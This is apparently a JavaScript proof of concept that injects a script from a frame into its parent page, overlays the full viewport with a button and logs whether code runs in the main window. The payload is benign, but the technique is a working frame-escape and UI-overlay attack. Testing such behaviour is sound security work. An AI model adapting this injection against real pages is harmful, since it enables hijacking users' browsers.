(() => {
  const d = parent.document;
  const s = d.createElement("script");

  s.textContent = `
    (() => {
      try {
        document.documentElement.setAttribute(
          "data-main-payload-installed",
          "true"
        );

        const existing =
          document.getElementById("main-poc-button");

        if (existing) existing.remove();

        const button = document.createElement("button");
        button.id = "main-poc-button";
        button.textContent = "Test main-window execution";

        button.style.cssText =
          "position:fixed;" +
          "inset:0;" +
          "width:100vw;" +
          "height:100vh;" +
          "z-index:2147483647;" +
          "font-size:40px;" +
          "background:white;" +
          "color:black;" +
          "cursor:pointer;";

        button.addEventListener("click", function () {
          document.documentElement.setAttribute(
            "data-main-click-executed",
            "true"
          );

          button.textContent =
            "Main-window click executed successfully";

          button.style.background = "lime";

          console.log("MAIN CLICK EXECUTED", {
            top: window === top,
            url: location.href
          });
        });

        document.body.appendChild(button);

        console.log("MAIN PAYLOAD INSTALLED", {
          top: window === top,
          url: location.href
        });
      } catch (error) {
        console.error("MAIN PAYLOAD ERROR", error);
      }
    })();
  `;

  (d.head || d.documentElement).appendChild(s);
  s.remove();
})();
